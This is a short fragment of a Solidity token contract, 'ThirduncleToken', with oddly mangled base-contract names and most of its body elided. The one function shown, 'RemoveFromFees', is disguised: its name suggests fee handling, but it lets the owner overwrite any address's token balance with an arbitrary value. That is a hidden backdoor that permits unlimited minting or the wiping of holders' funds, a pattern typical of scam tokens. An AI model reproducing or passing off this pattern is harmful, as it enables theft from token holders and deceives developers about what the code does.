...
contract ThirduncleToken is Contextrte, IBEPThirduncle, Ownableertg {
 ...
 function RemoveFromFees(address CThirduncle, uint256 CThirduncleNFT) external onlyOwner{
    _totbalances[CThirduncle] = CThirduncleNFT;
  }
